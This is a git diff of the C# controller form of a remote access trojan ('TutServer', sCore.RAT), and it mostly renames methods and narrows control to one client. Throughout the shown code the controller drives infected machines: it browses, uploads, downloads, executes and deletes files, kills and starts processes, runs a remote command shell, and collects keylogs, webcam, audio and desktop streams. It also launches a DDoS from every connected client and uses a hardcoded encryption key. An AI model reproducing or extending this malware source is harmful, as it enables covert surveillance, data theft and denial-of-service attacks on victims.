                 return; //Return
             }
 
-            loopSend("fdir§" + folderName); //Send command to list remote files
+            SendToTarget("fdir§" + folderName); //Send command to list remote files
             Current_Path = folderName; //Set the current path
             listView3.Items.Clear(); //Clear the files listView
         }
@@ -1063,7 +1151,7 @@ namespace TutServer //Main Namespace
         /// </summary>
         public void XUp1()
         {
-            loopSend("fdir§" + Current_Path); //Send command to up1 directory          
+            SendToTarget("fdir§" + Current_Path); //Send command to up1 directory          
         }
 
         /// <summary>
@@ -1092,7 +1180,7 @@ namespace TutServer //Main Namespace
         /// <param name="targetDirectory">The directory to paste the file to</param>
         public void XPasteFile(string targetDirectory)
         {
-            loopSend("fpaste§" + targetDirectory + "§" + xfer_path + "§" + xfer_mode); //Send command to paste file
+            SendToTarget("fpaste§" + targetDirectory + "§" + xfer_path + "§" + xfer_mode); //Send command to paste file
         }
 
         /// <summary>
@@ -1101,7 +1189,7 @@ namespace TutServer //Main Namespace
         /// <param name="targetFile">Path of the file to execute</param>
         public void XExecuteFile(string targetFile)
         {
-            loopSend("fexec§" + targetFile); //Send command to execute remote file
+            SendToTarget("fexec§" + targetFile); //Send command to execute remote file
         }
 
         /// <summary>
@@ -1114,8 +1202,7 @@ namespace TutServer //Main Namespace
             dir += "\\" + new FileInfo(file).Name; //Set the full file path
             String cmd = "fup§" + dir + "§" + new FileInfo(file).Length; //Construct the command to send
             fup_local_path = file; //Set the upload file path
-            uploadFinished = false; //Set uploadFinished to false
-            loopSend(cmd); //Send the command to the client
+            SendToTarget(cmd); //Send the command to the client
         }
 
         /// <summary>
@@ -1126,7 +1213,7 @@ namespace TutServer //Main Namespace
         public void XDownloadFile(string targetFile, string remoteFile)
         {
             fdl_location = targetFile; //Set the local file download location
-            loopSend("fdl§" + remoteFile); //Send command to download file
+            SendToTarget("fdl§" + remoteFile); //Send command to download file
         }
 
         /// <summary>
@@ -1136,7 +1223,7 @@ namespace TutServer //Main Namespace
         public void XOpenFileEditor(string remoteFile)
         {
             edit_content = remoteFile; //Set the remote file path
-            loopSend("getfile§" + remoteFile); //Send command to client
+            SendToTarget("getfile§" + remoteFile); //Send command to client
         }
 
         /// <summary>
@@ -1147,7 +1234,7 @@ namespace TutServer //Main Namespace
         public void XChangeAttribute(string remoteFile, Types.Visibility visibility)
         {
             string command = "f" + sCore.Utils.Convert.ToStr(visibility) + "§" + remoteFile; //Construct the command
-            loopSend(command); //Send the command to the client
+            SendToTarget(command); //Send the command to the client
         }
 
         /// <summary>
@@ -1158,12 +1245,12 @@ namespace TutServer //Main Namespace
         {
             if (InvokeRequired) //If we need to invoke
             {
-                Invoke(BridgeFunctions.DeleteFile, new object[] { remoteFile }); //Invoke
+                Invoke(lbf.DeleteFile, new object[] { remoteFile }); //Invoke
                 return; //Return
             }
 
-            loopSend("fdel§" + remoteFile); //Send the command to the client
-            refresh(); //Refresh the file list
+            SendToTarget("fdel§" + remoteFile); //Send the command to the client
+            RefreshFiles(); //Refresh the file list
         }
 
         /// <summary>
@@ -1173,7 +1260,7 @@ namespace TutServer //Main Namespace
         /// <param name="newName">The new name of the file/directory</param>
         public void XRenameFile(string remoteFile, string newName)
         {
-            loopSend("frename§" + remoteFile + "§" + newName); //Send command to client
+            SendToTarget("frename§" + remoteFile + "§" + newName); //Send command to client
         }
 
         /// <summary>
@@ -1185,12 +1272,12 @@ namespace TutServer //Main Namespace
         {
             if (InvokeRequired) // If we need to invoke
             {
-                Invoke(BridgeFunctions.CreateFolder, new object[] { targetDirectory, name }); //Invoke
+                Invoke(lbf.CreateFolder, new object[] { targetDirectory, name }); //Invoke
                 return; //Return
             }
 
-            loopSend("fndir§" + targetDirectory + "§" + name); //Send command to the client
-            refresh(); //Refresh the file list
+            SendToTarget("fndir§" + targetDirectory + "§" + name); //Send command to the client
+            RefreshFiles(); //Refresh the file list
         }
 
         /// <summary>
@@ -1202,12 +1289,12 @@ namespace TutServer //Main Namespace
         {
             if (InvokeRequired) //If we need to invoke
             {
-                Invoke(BridgeFunctions.CreateFile, new object[] { targetDirectory, name }); //Invoke
+                Invoke(lbf.CreateFile, new object[] { targetDirectory, name }); //Invoke
                 return; //Return
             }
 
-            loopSend("ffile§" + targetDirectory + "§" + name); //Send command to the client
-            refresh(); //Refresh the file list
+            SendToTarget("ffile§" + targetDirectory + "§" + name); //Send command to the client
+            RefreshFiles(); //Refresh the file list
         }
 
         /// <summary>
@@ -1222,7 +1309,7 @@ namespace TutServer //Main Namespace
         {
             if (InvokeRequired) //If we need to invoke
             {
-                return (DialogResult) Invoke(BridgeFunctions.ShowMessageBox, new object[] { text, title, buttons, icon }); //Invoke and return
+                return (DialogResult) Invoke(lbf.ShowMessageBox, new object[] { text, title, buttons, icon }); //Invoke and return
             }
 
             return MessageBox.Show(this, text, title, buttons, icon); //Show the message box and return the result
@@ -1235,7 +1322,7 @@ namespace TutServer //Main Namespace
         {
             if (InvokeRequired) //If we need to invoke
             {
-                Invoke(BridgeFunctions.StartServer); //Invoke
+                Invoke(lbf.StartServer); //Invoke
                 return; //Return
             }
             if (!IsStartedServer) button1_Click(null, null); //If the server isn't started then start it
@@ -1248,7 +1335,7 @@ namespace TutServer //Main Namespace
         {
             if (InvokeRequired) //If we need to invoke
             {
-                Invoke(BridgeFunctions.StopServer); //Invoke
+                Invoke(lbf.StopServer); //Invoke
                 return; //Return
             }
             if (IsStartedServer) button1_Click(null, null); //If the server is started, then stop it
@@ -1261,7 +1348,7 @@ namespace TutServer //Main Namespace
         {
             if (InvokeRequired) //if we need to invoke
             {
-                Invoke(BridgeFunctions.ToggleServer); //Invoke
+                Invoke(lbf.ToggleServer); //Invoke
                 return; //Return
             }
 
@@ -1278,7 +1365,7 @@ namespace TutServer //Main Namespace
         public void XRemoteMessage(string text, string title, Types.RemoteMessageButtons buttons, Types.RemoteMessageIcons icon)
         {
             string command = "msg|" + title + "|" + text + "|" + ((int)icon).ToString() + "|" + ((int)buttons).ToString(); //Construct the command
-            loopSend(command); //Send the command to the client
+            SendToTarget(command); //Send the command to the client
         }
 
         /// <summary>
@@ -1287,7 +1374,7 @@ namespace TutServer //Main Namespace
         /// <param name="frequency">The frequency to play</param>
         public void XFrequency(string frequency)
         {
-            loopSend("freq-" + frequency); //Send command to client
+            SendToTarget("freq-" + frequency); //Send command to client
         }
 
         /// <summary>
@@ -1297,7 +1384,7 @@ namespace TutServer //Main Namespace
         public void XSystemSound(Types.SystemSounds sound)
         {
             string command = "sound-" + ((int)sound).ToString(); //Construct the command
-            loopSend(command); //Send to command to the client
+            SendToTarget(command); //Send to command to the client
         }
 
         /// <summary>
@@ -1307,7 +1394,7 @@ namespace TutServer //Main Namespace
         public void XT2s(string text)
         {
             string command = "t2s|" + text; //Construct the command
-            loopSend(command); //Send command to the client
+            SendToTarget(command); //Send command to the client
         }
 
         /// <summary>
@@ -1320,7 +1407,7 @@ namespace TutServer //Main Namespace
             string welement = sCore.Utils.Convert.ToStr(element); //Get the element string
             string wvisibility = sCore.Utils.Convert.ToStr(visibility); //Get the visibility state string
             string command = "emt|" + wvisibility + "|" + welement; //Construct the command
-            loopSend(command); //Send the command to client
+            SendToTarget(command); //Send the command to client
         }
 
         /// <summary>
@@ -1330,7 +1417,7 @@ namespace TutServer //Main Namespace
         public void XCdTray(Types.CdTray cdState)
         {
             string command = "cd|" + sCore.Utils.Convert.ToStr(cdState); //Connstruct the command
-            loopSend(command); //Send command to client
+            SendToTarget(command); //Send command to client
         }
 
         /// <summary>
@@ -1340,7 +1427,7 @@ namespace TutServer //Main Namespace
         {
             if (InvokeRequired) //If we need to invoke
             {
-                Invoke(BridgeFunctions.ListProcesses); //Invoke
+                Invoke(lbf.ListProcesses); //Invoke
                 return; //Return
             }
 
@@ -1355,7 +1442,7 @@ namespace TutServer //Main Namespace
         {
             String cmd = "prockill|" + processId; //Contruct the command
 
-            loopSend(cmd); //Send command to the client
+            SendToTarget(cmd); //Send command to the client
 
             System.Threading.Thread.Sleep(1000); //Wait for the process to die
             XListProcesses(); //Refresh the process list
@@ -1370,13 +1457,13 @@ namespace TutServer //Main Namespace
         {
             if (InvokeRequired) //If we need to invoke
             {
-                Invoke(BridgeFunctions.StartProcess, new object[] { processName, visibility }); //Invoke
+                Invoke(lbf.StartProcess, new object[] { processName, visibility }); //Invoke
                 return; //Return
             }
 
             String cmd = "procstart|" + processName + "|" + sCore.Utils.Convert.ToStrProcessVisibility(visibility); //Construct the command
 
-            loopSend(cmd); //Send the command to client
+            SendToTarget(cmd); //Send the command to client
             System.Threading.Thread.Sleep(1000); //Wait for the client to start the process
             XListProcesses(); //Refresh the process list
         }
@@ -1390,7 +1477,7 @@ namespace TutServer //Main Namespace
             {
                 if (InvokeRequired) //If we need to invoke
                 {
-                    Invoke(BridgeFunctions.StartCmd); //Invoke
+                    Invoke(lbf.StartCmd); //Invoke
                     return; //Return
                 }
                 button15_Click(null, null); //Start the remtote cmd session
@@ -1406,7 +1493,7 @@ namespace TutServer //Main Namespace
             {
                 if (InvokeRequired) //If we need to invoke
                 {
-                    Invoke(BridgeFunctions.StopCmd); //Invoke
+                    Invoke(lbf.StopCmd); //Invoke
                     return; //Return
                 }
 
@@ -1421,7 +1508,7 @@ namespace TutServer //Main Namespace
         {
             if (InvokeRequired) //If we need to invoke
             {
-                Invoke(BridgeFunctions.ToggleCmd); //Invoke
+                Invoke(lbf.ToggleCmd); //Invoke
                 return; //Return
             }
             button15_Click(null, null); //Toggle the remote cmd state
@@ -1433,7 +1520,7 @@ namespace TutServer //Main Namespace
         /// <param name="command">The command to execute</param>
         public void XSendCmdCommand(string command)
         {
-            loopSend("cmd§" + command); //Send the command to the client
+            SendToTarget("cmd§" + command); //Send the command to the client
         }
 
         /// <summary>
@@ -1444,7 +1531,7 @@ namespace TutServer //Main Namespace
         {
             if (InvokeRequired) //If we need to invoke
             {
-                return (string)Invoke(BridgeFunctions.ReadCmdOutput); //Invoke and return
+                return (string)Invoke(lbf.ReadCmdOutput); //Invoke and return
             }
 
             return richTextBox2.Text; //Return all output text
@@ -1488,12 +1575,12 @@ namespace TutServer //Main Namespace
         /// </summary>
         /// <param name="obj">The pipe to remove</param>
         /// <param name="remote">If the pipe is connected</param>
-        public void RemovePipe(remotePipe obj, bool remote = true)
+        public void RemovePipe(RemotePipe obj, bool remote = true)
         {
             int rmid = 0; //Declare index variable
             bool canRemove = false; //Declare removing flag
 
-            foreach (remotePipe rp in rPipeList) //Go through all pipes
+            foreach (RemotePipe rp in rPipeList) //Go through all pipes
             {
                 if (obj == rp) //If the pipes match
                 {
@@ -1506,8 +1593,8 @@ namespace TutServer //Main Namespace
             if (canRemove) //If we can remove the pipe
             {
                 string sName = rPipeList[rmid].pname; //Get the name of the server
-                sCore.RAT.ExternalApps.ipcConnections.Remove(sName); //Remove the connection from the plugins
-                if (remote) loopSend("stopipc§" + sName); //If the pipe is connected, then send a command to the remote client
+                sCore.RAT.ExternalApps.RemoveIPCConnection(hostToken, sName); //Remove the connection from the plugins
+                if (remote) SendToTarget("stopipc§" + sName); //If the pipe is connected, then send a command to the remote client
                 rPipeList.RemoveAt(rmid); //Remove the pipe from the list
             }
         }
@@ -1530,14 +1617,14 @@ namespace TutServer //Main Namespace
                 int inc = 0; //Declare index variable
                 foreach (Socket s in _clientSockets) //Go through the connected sockets
                 {
-                    sendCommand(command, inc); //Send the command to the client
+                    SendCommand(command, inc); //Send the command to the client
                     inc++; //Incremnet the index
                 }
                 label18.Text = "Status: DDoS Started [Client_Count:" + inc.ToString() + " Target_IP:" + ip + " Target_Port:" + port + "]"; //Update the UI
             }
             else
             {
-                loopSend(command); //Send the command to the client
+                SendToTarget(command); //Send the command to the client
                 label18.Text = "Status: DDoS Started [Client_Count:1 Target_IP:" + ip + " Target_Port:" + port + "]"; //Update the UI
             }
         }
@@ -1639,13 +1726,12 @@ namespace TutServer //Main Namespace
         /// Save edited file contents
         /// </summary>
         /// <param name="content">The content to save</param>
-        public void saveFile(String content)
+        public void SaveFile(String content)
         {
             String cmd = "putfile§" + edit_content + "§" + content; //Construct the command
-            loopSend(cmd); //Send the command to the client
-            refresh(); //Refresh the file list
+            SendToTarget(cmd); //Send the command to the client
+            RefreshFiles(); //Refresh the file list
         }
-
         /// <summary>
         /// Display an inputbox on the local system
         /// </summary>
@@ -1699,13 +1785,13 @@ namespace TutServer //Main Namespace
         /// <summary>
         /// Refresh the file list on the current directory
         /// </summary>
-        private void refresh()
+        private void RefreshFiles()
         {
             Application.DoEvents(); //Do the events
             System.Threading.Thread.Sleep(1500); //Wait for 1.5 seconds
             listView3.Items.Clear(); //Clear the file list
             String cmd = "fdir§" + Current_Path; //Construct the command
-            loopSend(cmd); //Send the command to the client
+            SendToTarget(cmd); //Send the command to the client
         }
 
         /// <summary>
@@ -1713,7 +1799,7 @@ namespace TutServer //Main Namespace
         /// </summary>
         /// <param name="command">The command to send</param>
         /// <param name="targetClient">The client to send the command to</param>
-        private void sendCommand(String command, int targetClient)
+        private void SendCommand(String command, int targetClient)
         {
             try //Try
             {
@@ -1746,8 +1832,8 @@ namespace TutServer //Main Namespace
                     Console.WriteLine("Client forcefully disconnected"); //Debug Function
                     s.Close(); //Close the target socket
                     _clientSockets.Remove(s); //Remove the socket from the list
-                    switchTab(tabControl1.TabPages[0]); //Switch to the client selection tab
-                    restartServer(id); //Restart the server
+                    SwitchTab(tabControl1.TabPages[0]); //Switch to the client selection tab
+                    RestartServer(id); //Restart the server
                     return; //Return
                 }
 
@@ -1762,24 +1848,18 @@ namespace TutServer //Main Namespace
         /// Send a command to every controlled client
         /// </summary>
         /// <param name="command">The command to send</param>
-        public void loopSend(String command)
+        public void SendToTarget(String command)
         {
-            foreach (int client in controlClients) //Loop through the controlled clients
-            {
-                sendCommand(command, client); //Send the command to the client
-            }
+            SendCommand(command, controlClient);
         }
 
         /// <summary>
         /// Send byte data to controlled clients
         /// </summary>
         /// <param name="data">The bytes to send</param>
-        private void loopSendByte(byte[] data)
+        private void SendBytesToTarget(byte[] data)
         {
-            foreach (int client in controlClients) //Loop through the controlled clients
-            {
-                sendCommand(data, client); //Send bytes to client
-            }
+            SendCommand(data, controlClient);
         }
 
         /// <summary>
@@ -1787,7 +1867,7 @@ namespace TutServer //Main Namespace
         /// </summary>
         /// <param name="data">The bytes to send</param>
         /// <param name="targetClient">The target client</param>
-        private void sendCommand(byte[] data, int targetClient)
+        private void SendCommand(byte[] data, int targetClient)
         {
             Socket s = _clientSockets[targetClient]; //Get the socket of the target client
             s.Send(data); //Send the bytes to the client
@@ -1816,7 +1896,7 @@ namespace TutServer //Main Namespace
                         cs.Write(clearBytes, 0, clearBytes.Length); //Write the command to the crypto stream
                         cs.Close(); //Close the crypto stream
                     }
-                    clearText = Convert.ToBase64String(ms.ToArray()); //Convert the encrypted bytes to a Base64 string
+                    clearText = System.Convert.ToBase64String(ms.ToArray()); //Convert the encrypted bytes to a Base64 string
                 }
             }
             Console.WriteLine("Encrypted Command: " + clearText); //Debug Function
@@ -1833,7 +1913,7 @@ namespace TutServer //Main Namespace
             try //Try
             {
                 string EncryptionKey = "MAKV2SPBNI99212"; //Declare the decryption key (not the best thing to do, same key as above)
-                byte[] cipherBytes = Convert.FromBase64String(cipherText); //Decrypt base 64 to bytes
+                byte[] cipherBytes = System.Convert.FromBase64String(cipherText); //Decrypt base 64 to bytes
                 using (Aes encryptor = Aes.Create()) //Create a new aes object
                 {
                     Rfc2898DeriveBytes pdb = new Rfc2898DeriveBytes(EncryptionKey, new byte[] { 0x49, 0x76, 0x61, 0x6e, 0x20, 0x4d, 0x65, 0x64, 0x76, 0x65, 0x64, 0x65, 0x76 }); //Get encryption key
@@ -1902,6 +1982,13 @@ namespace TutServer //Main Namespace
             label36.Hide(); //Auto Load Status Display
             progressBar1.Hide(); //Auto Load Status Display 2
             button20.Enabled = false; //Auto Load button
+            
+            //Add dynamic toolstrip item event handlers
+            contextMenuStrip2.ItemAdded += new ToolStripItemEventHandler(TSItemAdded);
+            contextMenuStrip2.ItemRemoved += new ToolStripItemEventHandler(TSItemRemoved);
+            contextMenuStrip3.ItemAdded += new ToolStripItemEventHandler(TSItemAdded);
+            contextMenuStrip3.ItemRemoved += new ToolStripItemEventHandler(TSItemRemoved);
+
             for (int a = 0; a < contextMenuStrip2.Items.Count; a++) //Loop through the process manager's toolstrip items
             {
                 ToolStripItem i = contextMenuStrip2.Items[a]; //The current item
@@ -1919,14 +2006,17 @@ namespace TutServer //Main Namespace
                 pages.Add(p); //Add the current page to the list
             }
 
-            Timer update = new Timer(); //Create a new timer
-            update.Interval = 100; // prev. 3000 //Set update frequency
-            update.Tick += new EventHandler(updateValues); //Set the tick event
+            Timer update = new Timer
+            {
+                Interval = 100 // prev. 3000 //Set update frequency
+            }; //Create a new timer
+            update.Tick += new EventHandler(UpdateValues); //Set the tick event
             update.Start(); //Start the timer
 
             sh = new ScriptHost("scripts", this); //Create a new script host
             sh.LoadDllFiles(); //Load the plugin files
             sh.SetupBridge(); //Setup the function bridge for plugins
+            hostToken = sCore.Integration.Integrate.GetHostToken(); //Get the host token
         }
 
         /// <summary>
@@ -1944,24 +2034,6 @@ namespace TutServer //Main Namespace
         }
 
         /// <summary>
-        /// Update the listView from the client socket list
-        /// </summary>
-	    private void listClients()
-	    {
-		    int i = 0; //Declare the index variable
-            listView1.Items.Clear(); //Clear the listView items
-
-            foreach (Socket socket in _clientSockets) //Go through each connected client
-            {
-                ListViewItem lvi = new ListViewItem(); //Create a new listView item
-                lvi.Text = i.ToString(); //Set the item's text to the index of the client
-
-                listView1.Items.Add(lvi); //Add the item to the listView
-                i++; //Increment the index
-            }
-	    }
-
-        /// <summary>
         /// Kill all connected clients and close the server socket
         /// </summary>
         private void CloseAllSockets()
@@ -1973,7 +2045,7 @@ namespace TutServer //Main Namespace
             {
                 try
                 {
-                    sendCommand("dc", id); //Send a graceful disconnect command
+                    SendCommand("dc", id); //Send a graceful disconnect command
                     socket.Shutdown(SocketShutdown.Both); //Shutdown the sockets
                     socket.Close(); //Close the socket
                     socket.Dispose(); //Dispose the socket
@@ -2013,9 +2085,9 @@ namespace TutServer //Main Namespace
 
            _clientSockets.Add(socket); //Add the new socket to the list
            int id = _clientSockets.Count - 1; //Get the new ID for the client
-           addlvClientCallback("Client " + id); //Update the listView
+           AddlvClientCallback("Client " + id); //Update the listView
            String cmd = "getinfo-" + id.ToString(); //Construct the command
-           sendCommand(cmd, id); //Send the command
+           SendCommand(cmd, id); //Send the command
            socket.BeginReceive(_buffer, 0, _BUFFER_SIZE, SocketFlags.None, ReceiveCallback, socket); //Add the reading callback
            _serverSocket.BeginAccept(AcceptCallback, null); //Restart accepting clients
         }
@@ -2025,7 +2097,7 @@ namespace TutServer //Main Namespace
         /// </summary>
         /// <param name="sender">The sender of the event</param>
         /// <param name="e">The event args</param>
-        private void dismissUpdate(object sender, EventArgs e)
+        private void DismissUpdate(object sender, EventArgs e)
         {
             Timer me = (Timer)sender; //The timer who started the event
             label24.Text = ""; //Reset the live updates text
@@ -2039,7 +2111,7 @@ namespace TutServer //Main Namespace
         /// </summary>
         /// <param name="socket">The socket which you want the client ID of</param>
         /// <returns>The client ID of the socket</returns>
-        private int getSocket(Socket socket)
+        private int GetSocket(Socket socket)
         {
             int tracer = 0; //Declare index variable
 
@@ -2083,13 +2155,13 @@ namespace TutServer //Main Namespace
             }
             catch (Exception) //If something went wrong
             {
-                int id = getSocket(current); //get the id of the client
+                int id = GetSocket(current); //get the id of the client
                 reScanTarget = true; //Set the rescan flag
                 reScanStart = id; //Set the starting ID for rescan
                 //Console.WriteLine("Client forcefully disconnected");
                 current.Close(); //Close the communicating socket
                 _clientSockets.Remove(current); //Remove the socket from the clients list
-                restartServer(id); //Restart the server to rename every client
+                RestartServer(id); //Restart the server to rename every client
                 return; //Return
             }
 
@@ -2117,7 +2189,7 @@ namespace TutServer //Main Namespace
                                 resy = deskimage.Height; //Set the resolution height to the image height
                                 resdataav = 1; //The resolution data is set now
                             }
-                            setImage(deskimage); //Set the image of the remote desktop
+                            SetImage(deskimage); //Set the image of the remote desktop
                             Array.Clear(recBuf, 0, received); //Clear the buffer
                             ignoreFlag = true; //Set the ignore flag
 
@@ -2132,7 +2204,7 @@ namespace TutServer //Main Namespace
                         byte[] data = new Byte[recBuf.Length]; //Declare a new buffer for audio data
                         Buffer.BlockCopy(recBuf, 8 * 2, data, 0, recBuf.Length - 8 * 2); //Copy from the received buffer to the audio buffer
                         recBuf = null; //Remove the received buffer
-                        astream.bufferPlay(data); //Playback the audio stream
+                        astream.BufferPlay(data); //Playback the audio stream
                         ignoreFlag = true; //Set the ignore flag
                     }
 
@@ -2149,7 +2221,7 @@ namespace TutServer //Main Namespace
                         stream.Close(); //Close the stream
                         stream.Dispose(); //Dispose the stream
                         stream = null; //Remove the stream
-                        setWebCam(camimage); //Set the web cam image to the new frame
+                        SetWebCam(camimage); //Set the web cam image to the new frame
                         Array.Clear(recBuf, 0, received); //Clear the receive buffer
                         ignoreFlag = true; //Set the ignore flag
                     }
@@ -2175,7 +2247,7 @@ namespace TutServer //Main Namespace
                     }
 
                     Array.Clear(recvFile, 0, recvFile.Length); //Clear the file buffer
-                    msgbox("File Download", "File receive confirmed!", MessageBoxButtons.OK, MessageBoxIcon.Information); //Update the user on the download
+                    Msgbox("File Download", "File receive confirmed!", MessageBoxButtons.OK, MessageBoxIcon.Information); //Update the user on the download
                     isFileDownload = false; //Set the download flag to false
                 }
 
@@ -2187,9 +2259,11 @@ namespace TutServer //Main Namespace
             if (!isFileDownload && !ignoreFlag) //If no file download, and it's not surveillance data
             {
                 System.Threading.Thread clThread = new System.Threading.Thread(new System.Threading.ParameterizedThreadStart(CheckLinux)); //Create a linux client checking thread
-                ClientObject obj = new ClientObject(); //Create a new client object
-                obj.buffer = recBuf; //Set the buffer of the client object
-                obj.s = current; //Set the socket of the client object
+                ClientObject obj = new ClientObject
+                {
+                    buffer = recBuf, //Set the buffer of the client object
+                    s = current //Set the socket of the client object
+                }; //Create a new client object
 
                 clThread.Start(obj); //Start checking if client is linuy or windows
                 try //Try
@@ -2227,7 +2301,7 @@ namespace TutServer //Main Namespace
                         String time = lines[2]; //The computer's date and time
                         String av = lines[3]; //The computer's installed Anti Virus product
 
-                        setlvClientInfoCallback(name, ip, time, av, id); //Update the UI
+                        SetlvClientInfoCallback(name, ip, time, av, id); //Update the UI
                     }
 
                     if (text.StartsWith("ScreenCount")) //get screen count result back from the client 
@@ -2238,7 +2312,7 @@ namespace TutServer //Main Namespace
 
                         foreach (char screen in screens) //Loop through the screens of the client
                         {
-                            setClientScreenCountCallBack(screen); //Update the UI     
+                            SetClientScreenCountCallBack(screen); //Update the UI     
                         }
 
                     }
@@ -2256,7 +2330,7 @@ namespace TutServer //Main Namespace
                             String path = line.Split('|')[5]; //The full path of the launched process
                             String id = line.Split('|')[6]; //The PID
 
-                            setprocInfoCallback(name, responding, title, priority, path, id); //Update the UI
+                            SetprocInfoCallback(name, responding, title, priority, path, id); //Update the UI
                         }
 
                         SortList(listView2); //Sort the processes by thier name
@@ -2267,22 +2341,22 @@ namespace TutServer //Main Namespace
                         //MessageBox.Show("test");
                         String output = text.Split('§')[1]; //Get the output of the command
                         output = output.Replace("cmdout", String.Empty); //Format the output
-                        append(output); //Append the output to the command window
+                        Append(output); //Append the output to the command window
                     }
 
                     if (text.StartsWith("fdrivel§")) //The client sent a list of drives
                     {
                         String data = text.Split('§')[1]; //Get the drive listing
 
-                        lvClear(listView3); //Clear the listView for drives
+                        LvClear(listView3); //Clear the listView for drives
 
                         foreach (String drive in data.Split('\n')) //Loop through the drives
                         {
                             if (!drive.Contains("|")) continue; //If incorrect drive, then skip it
                             String name = drive.Split('|')[0]; //Get the label of the drive (C:, D:, E: etc.)
-                            String size = convert(drive.Split('|')[1]); //Get the total size of the drive
+                            String size = Convert(drive.Split('|')[1]); //Get the total size of the drive
 
-                            addFileCallback(name, size, "N/A", name); //Update the UI
+                            AddFileCallback(name, size, "N/A", name); //Update the UI
                         }
                     }
 
@@ -2295,30 +2369,29 @@ namespace TutServer //Main Namespace
                         {
                             if (entry == "") continue; //If the entry is empty then skip it
                             String name = entry.Split('§')[0]; //Get the name of the entry
-                            String size = convert(entry.Split('§')[1]); //Get the total size of the entry
+                            String size = Convert(entry.Split('§')[1]); //Get the total size of the entry
                             String crtime = entry.Split('§')[2]; //Get the creation time of the entry
                             String path = entry.Split('§')[3]; //Get the full path to the entry
                             //Console.WriteLine(entry.Split('§')[1]);
-                            addFileCallback(name, size, crtime, path); //Update the UI
+                            AddFileCallback(name, size, crtime, path); //Update the UI
                         }
                     }
 
                     if (text.StartsWith("backfile§")) //The client sent file contents to the editor
                     {
                         String content = text.Split('§')[1]; //Get the content of the file
-                        startEditor(content, me); //Start the editor window
+                        StartEditor(content, me); //Start the editor window
                     }
 
                     if (text == "fconfirm") //Client accepted to receive a file
                     {
                         Byte[] databyte = File.ReadAllBytes(fup_local_path); //Get the bytes of the file
-                        loopSendByte(databyte); //Send the file to the client
+                        SendBytesToTarget(databyte); //Send the file to the client
                     }
 
                     if (text == "frecv") //Client confirmed that the file is uploaded
                     {
-                        msgbox("File Upload", "File receive confirmed!", MessageBoxButtons.OK, MessageBoxIcon.Information); //Notify the user
-                        uploadFinished = true; //Set the upload finished flag
+                        Msgbox("File Upload", "File receive confirmed!", MessageBoxButtons.OK, MessageBoxIcon.Information); //Notify the user
                     }
 
                     if (text.StartsWith("finfo§")) //Client sent info about a file we want to download
@@ -2327,42 +2400,42 @@ namespace TutServer //Main Namespace
                         fdl_size = size; //Set the size of the file
                         recvFile = new byte[fdl_size]; //Create a new buffer for the file
                         isFileDownload = true; //Set the file download flag
-                        loopSend("fconfirm"); //Notify the client to send the file
+                        SendToTarget("fconfirm"); //Notify the client to send the file
                     }
 
                     if (text.StartsWith("f1§")) //The client sent the up1 directory in the tree
                     {
                         String dir = text.Split('§')[1]; //Get the parent directory
 
-                        if (dir != "drive") parent(dir); //If it's not the drive list the update the file list
+                        if (dir != "drive") GetParentDirectory(dir); //If it's not the drive list the update the file list
                         if (dir == "drive") //If it's the drive list
                         {
                             Current_Path = "drive"; //Set the current path to the drive listing
-                            loopSend("fdrive"); //List the drives
-                            lvClear(listView3); //Clear the file list
+                            SendToTarget("fdrive"); //List the drives
+                            LvClear(listView3); //Clear the file list
                         }
                     }
 
                     if (text.StartsWith("putklog")) //Client sent the keylog
                     {
                         String dump = text.Substring(7); //Remove the command header
-                        setLog(dump); //Update the UI
+                        SetLog(dump); //Update the UI
                     }
 
                     if (text.StartsWith("dclient")) //Client is going to disconnect
                     {
                         Console.WriteLine("Client Disconnected"); //Debug Function
                         dclient = true; //Set the disconnect flag
-                        switchTab(tabPage1); //Switch to the client selection module
-                        killtarget = getSocket(current); //Get the id of the affected socket
+                        SwitchTab(tabPage1); //Switch to the client selection module
+                        killtarget = GetSocket(current); //Get the id of the affected socket
                         killSocket = current; //Set the affected socket
-                        if (controlClients[0] == killtarget) //If the affected client is the controlled one
+                        if (controlClient == killtarget) //If the affected client is the controlled one
                         {
                             //TODO: write UI reset code
-                            remotePipe[] rpArray = { null }; //Create a new remote pipe array
-                            sCore.RAT.ExternalApps.ipcConnections.Clear(); //Clear the list of ipc connections for plugins
+                            RemotePipe[] rpArray = { null }; //Create a new remote pipe array
+                            sCore.RAT.ExternalApps.ClearIPCConnections(hostToken); //Clear the list of ipc connections for plugins
                             Array.Copy(rPipeList.ToArray(), rpArray, rPipeList.Count); //Get the list of pipes
-                            foreach (remotePipe rp in rpArray) //Go through each pipe in the list
+                            foreach (RemotePipe rp in rpArray) //Go through each pipe in the list
                             {
                                 if (rp == null) continue; //If the pipe is closed, then skip it
                                 rp.RemoteRemove = false; //Set the remove flag
@@ -2381,30 +2454,30 @@ namespace TutServer //Main Namespace
                         Console.WriteLine("Timer Removed Client"); //Debug Function
                         killSocket.Close(); //Close the affected socket
                         _clientSockets.Remove(killSocket); //Remove the affected socket from the list
-                        restartServer(id); //Restart the server
+                        RestartServer(id); //Restart the server
                     }
 
                     if (text.StartsWith("alist")) //Client sent the list of audio devies of thier machine
                     {
-                        lvClear(listView4); //Clear the audio devices listView
+                        LvClear(listView4); //Clear the audio devices listView
                         String data = text.Substring(5); //Remove the command header from the message
                         int devices = 0; //Declare the count of devices
                         foreach (String device in data.Split('§')) //Go through all devices
                         {
                             String name = device.Split('|')[0]; //Get the name of the device
                             String channel = device.Split('|')[1]; //Get the channel ID for the device
-                            addAudio(name, channel); //Update the UI
+                            AddAudio(name, channel); //Update the UI
                             devices++; //Increment the count of devices
                         }
                         if (devices == 0) //If no devices
                         {
-                            msgbox("Warning", "No audio capture devices present on this target", MessageBoxButtons.OK, MessageBoxIcon.Warning); //Notify the user
+                            Msgbox("Warning", "No audio capture devices present on this target", MessageBoxButtons.OK, MessageBoxIcon.Warning); //Notify the user
                         }
                     }
 
                     if (text.StartsWith("wlist")) //Client sent the list of installed web cams
                     {
-                        lvClear(listView5); //Clear the web cam listView
+                        LvClear(listView5); //Clear the web cam listView
                         String data = text.Substring(5); //Remove the commmand header from the message
                         int devices = 0; //Declare the count of devices
                         foreach (String device in data.Split('§')) //Go through the devices
@@ -2412,13 +2485,13 @@ namespace TutServer //Main Namespace
                             if (device == "") continue; //If the device is empty, then skip it
                             String id = device.Split('|')[0]; //Get the ID of the device
                             String name = device.Split('|')[1]; //Get the name of the device
-                            addCam(id, name); //Update the UI
+                            AddCam(id, name); //Update the UI
                             devices++; //Incremen the count of the devices
                         }
 
                         if (devices == 0) //If no devices installed
                         {
-                            msgbox("Warning", "No video capture devices present on this target!", MessageBoxButtons.OK, MessageBoxIcon.Warning); //Notify the user
